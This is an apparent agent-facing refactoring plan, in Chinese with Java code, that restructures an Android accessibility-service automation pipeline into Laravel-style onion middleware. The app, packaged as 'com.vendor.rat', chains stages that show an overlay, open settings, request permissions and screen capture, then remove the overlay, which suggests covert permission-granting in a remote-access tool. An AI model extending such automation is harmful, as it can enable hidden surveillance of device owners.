# Laravel-Style Pipeline 优化计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 参考 Laravel `Illuminate\Pipeline\Pipeline` 优化现有 Android 自动化管道实现

**Architecture:** 采用 Laravel 的 fluent builder + onion 洋葱模型。每个 Pipe 的签名简化为 `handle(PipelineContext passable, Runnable next)` — 调用 `next.run()` 继续，不调用则终止。删除 `PipelineCallback`/`shouldSkip`/`onError`。新增 `finally` 支持。

**Tech Stack:** Java 8+, Android minSdk 21

---

## 与 Laravel Pipeline 的对照

| Laravel | 当前实现 | 优化后 |
|---------|---------|--------|
| `send($passable)->through($pipes)->then($dest)` | `new Pipeline(stages).execute(service)` | `Pipeline.send(ctx).through(pipes).then(dest)` |
| `handle($passable, Closure $next)` | `execute(ctx, PipelineCallback)` 4 个接口方法 | `handle(PipelineContext, Runnable next)` 1 个方法 |
| `$next($passable)` 继续, 不调用=终止 | `next.proceed()` / `next.abort()` | `next.run()` 继续, 不调用=终止 |
| `finally(Closure)` | 无 | `finally(Runnable)` |
| `array_reduce(reverse, carry, dest)` | 递归 `runStage(index)` | 洋葱嵌套 `reduce` |

## 文件变更

| 操作 | 文件 | 说明 |
|------|------|------|
| **重写** | `auto/pipeline/AutomationPipeline.java` | fluent builder + onion reduce + finally + 日志装饰 |
| **重写** | `auto/pipeline/PipelineStage.java` | 简化为单方法接口 `handle(ctx, next)` |
| **删除** | `auto/pipeline/PipelineCallback.java` | 不再需要，用 `Runnable` 替代 |
| **保留** | `auto/pipeline/PipelineContext.java` | 不变 (= Laravel 的 `$passable`) |
| **修改** | 10 个 `stage/*.java` | `execute(ctx, callback)` → `handle(ctx, next)` 签名变更；`shouldSkip` 逻辑移入 `handle` 开头 |

---

### Task 1: 重写 PipelineStage 接口

**Files:**
- Rewrite: `android/app/src/main/java/com/vendor/rat/auto/pipeline/PipelineStage.java`

- [ ] **Step 1: 重写接口为单方法**

```java
package com.vendor.rat.auto.pipeline;

/**
 * 管道中间件接口 — 对齐 Laravel Pipeline
 *
 * Laravel: $pipe->handle($passable, Closure $next)
 * Java:    pipe.handle(PipelineContext passable, Runnable next)
 *
 * 调用 next.run() 继续管道，不调用则终止（短路）。
 */
public interface PipelineStage {
    void handle(PipelineContext passable, Runnable next);
}
```

---

### Task 2: 删除 PipelineCallback

**Files:**
- Delete: `android/app/src/main/java/com/vendor/rat/auto/pipeline/PipelineCallback.java`

- [ ] **Step 1: 删除文件**

---

### Task 3: 重写 AutomationPipeline

**Files:**
- Rewrite: `android/app/src/main/java/com/vendor/rat/auto/pipeline/AutomationPipeline.java`

- [ ] **Step 1: 实现 Laravel-style fluent builder + onion reduce**

核心实现对照 Laravel `Pipeline.php`:

```java
package com.vendor.rat.auto.pipeline;

import android.util.Log;
import com.vendor.rat.auto.pipeline.stage.*;
import com.vendor.rat.service.MyAccessibilityService;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

/**
 * 自动化管道 — 对齐 Laravel Illuminate\Pipeline\Pipeline
 *
 * Laravel:  Pipeline::send($passable)->through($pipes)->then($dest)
 * Java:     AutomationPipeline.send(ctx).through(pipes).then(dest)
 *
 * 洋葱模型: 每个 pipe 包裹下一个，形成嵌套调用链。
 * pipe.handle(passable, next) 中调用 next.run() 继续，不调用则短路终止。
 */
public class AutomationPipeline {

    private static final String TAG = "Pipeline";

    // Laravel: $passable
    private PipelineContext passable;

    // Laravel: $pipes
    private final List<PipelineStage> pipes = new ArrayList<>();

    // Laravel: $finally
    private Runnable finallyCallback;

    // 静态引用，供 AutoEngine.Z() 获取当前管道上下文
    private static volatile PipelineContext currentContext;

    private AutomationPipeline() {}

    // ============ Fluent Builder (对齐 Laravel) ============

    /** Laravel: Pipeline::send($passable) */
    public static AutomationPipeline send(PipelineContext passable) {
        AutomationPipeline p = new AutomationPipeline();
        p.passable = passable;
        return p;
    }

    /** Laravel: ->through($pipes) */
    public AutomationPipeline through(PipelineStage... pipes) {
        this.pipes.addAll(Arrays.asList(pipes));
        return this;
    }

    /** Laravel: ->through($pipes) — List 版本 */
    public AutomationPipeline through(List<PipelineStage> pipes) {
        this.pipes.addAll(pipes);
        return this;
    }

    /** Laravel: ->pipe($pipes) — 追加 */
    public AutomationPipeline pipe(PipelineStage... pipes) {
        this.pipes.addAll(Arrays.asList(pipes));
        return this;
    }

    /** Laravel: ->finally(Closure) */
    public AutomationPipeline andFinally(Runnable callback) {
        this.finallyCallback = callback;
        return this;
    }

    // ============ 执行 (对齐 Laravel then/thenReturn) ============

    /**
     * Laravel: ->then(Closure $destination)
     *
     * 构建洋葱: array_reduce(array_reverse($pipes), carry(), destination)
     * 然后执行最外层 Runnable。
     */
    public void then(Runnable destination) {
        // 洋葱构建: 从最后一个 pipe 开始包裹
        List<PipelineStage> reversed = new ArrayList<>(pipes);
        Collections.reverse(reversed);

        // destination 是洋葱最内层
        Runnable pipeline = destination;

        // 逐层包裹 — 对齐 Laravel carry()
        for (PipelineStage pipe : reversed) {
            final Runnable next = pipeline;
            final String pipeName = pipe.getClass().getSimpleName();
            pipeline = () -> {
                long start = System.currentTimeMillis();
                Log.d(TAG, ">>> " + pipeName);
                try {
                    pipe.handle(passable, next);
                } catch (Exception e) {
                    Log.e(TAG, "!!! " + pipeName + " ERROR: " + e.getMessage(), e);
                    // 出错时继续管道（除非 pipe 自己决定不调用 next）
                    // 对齐 Laravel handleException — 默认 rethrow，子类可覆盖
                }
                long elapsed = System.currentTimeMillis() - start;
                Log.d(TAG, "<<< " + pipeName + " (" + elapsed + "ms)");
            };
        }

        // 执行洋葱
        try {
            pipeline.run();
        } finally {
            if (finallyCallback != null) {
                finallyCallback.run();
            }
        }
    }

    /** Laravel: ->thenReturn() — 执行后返回 passable */
    public PipelineContext thenReturn() {
        then(() -> {}); // 空 destination
        return passable;
    }

    // ============ 工厂方法 ============

    /**
     * 创建标准自动化管道并在后台线程执行
     */
    public static void executeStandard(MyAccessibilityService service) {
        PipelineContext ctx = new PipelineContext(service);
        currentContext = ctx;

        new Thread(() -> {
            Log.i(TAG, "=== Pipeline START ===");
            long start = System.currentTimeMillis();

            AutomationPipeline.send(ctx)
                .through(
                    new VersionCheckStage(),
                    new CompletionCheckStage(),
                    new ShowOverlayStage(),
                    new LaunchSettingsStage(),
                    new VendorEngineStage(),
                    new NavigateToAppStage(),
                    new PermissionRequestStage(),
                    new MediaProjectionStage(),
                    new RemoveOverlayStage(),
                    new MarkCompletedStage()
                )
                .andFinally(() -> {
                    currentContext = null;
                    long elapsed = System.currentTimeMillis() - start;
                    Log.i(TAG, "=== Pipeline END (" + elapsed + "ms) ===");
                })
                .thenReturn();

        }, "automation-pipeline").start();
    }

    /** 获取当前管道上下文 (供 AutoEngine.Z() 调用) */
    public static PipelineContext getCurrentContext() {
        return currentContext;
    }
}
```

---

### Task 4: 修改 10 个 Stage — 签名 `execute` → `handle`

**Files:** 所有 `stage/*.java`

每个 Stage 的变更模式相同:
1. `implements PipelineStage` 不变
2. 删除 `name()`, `shouldSkip()`, `onError()` — 不再是接口方法
3. `execute(PipelineContext context, PipelineCallback next)` → `handle(PipelineContext passable, Runnable next)`
4. `next.proceed()` → `next.run()`
5. `next.abort(reason)` → `return` (不调用 next = 短路终止)
6. `shouldSkip` 逻辑移入 `handle()` 开头: `if (condition) { next.run(); return; }`

**示例 — CompletionCheckStage 变更前后:**

```java
// 变更前
public void execute(PipelineContext context, PipelineCallback next) {
    if (completed && !context.isVersionChanged()) {
        next.abort("Keep-alive already completed");
        return;
    }
    next.proceed();
}

// 变更后 (Laravel style)
public void handle(PipelineContext passable, Runnable next) {
    boolean completed = isKeepAliveCompleted(passable.getAppContext());
    if (completed && !passable.isVersionChanged()) {
        Log.d(TAG, "Keep-alive completed, version unchanged, pipeline terminated");
        return;  // 不调用 next = 短路终止 (Laravel 风格)
    }
    next.run();  // 继续管道
}
```

**示例 — LaunchSettingsStage (原 shouldSkip 移入 handle):**

```java
// 变更后
public void handle(PipelineContext passable, Runnable next) {
    if (!passable.isHuawei() && !passable.isXiaomi()) {
        next.run();  // 跳过本阶段，继续管道
        return;
    }
    // ... 实际逻辑 ...
    next.run();
}
```

- [ ] **Step 1: 修改 VersionCheckStage**
- [ ] **Step 2: 修改 CompletionCheckStage**
- [ ] **Step 3: 修改 ShowOverlayStage**
- [ ] **Step 4: 修改 LaunchSettingsStage**
- [ ] **Step 5: 修改 VendorEngineStage**
- [ ] **Step 6: 修改 NavigateToAppStage**
- [ ] **Step 7: 修改 PermissionRequestStage**
- [ ] **Step 8: 修改 MediaProjectionStage**
- [ ] **Step 9: 修改 RemoveOverlayStage**
- [ ] **Step 10: 修改 MarkCompletedStage**

---

### Task 5: 修改 StrategyThread 调用方式

**Files:**
- Modify: `android/app/src/main/java/com/vendor/rat/keepalive/thread/StrategyThread.java`

- [ ] **Step 1: 更新 pipeline 调用**

```java
// 变更前
com.vendor.rat.auto.pipeline.AutomationPipeline pipeline =
    com.vendor.rat.auto.pipeline.AutomationPipeline.createStandard();
pipeline.execute(service);

// 变更后
com.vendor.rat.auto.pipeline.AutomationPipeline.executeStandard(service);
```

---

### Task 6: 构建验证

- [ ] **Step 1: `./gradlew assembleDebug` 无编译错误**
- [ ] **Step 2: 部署到 211 设备验证日志**
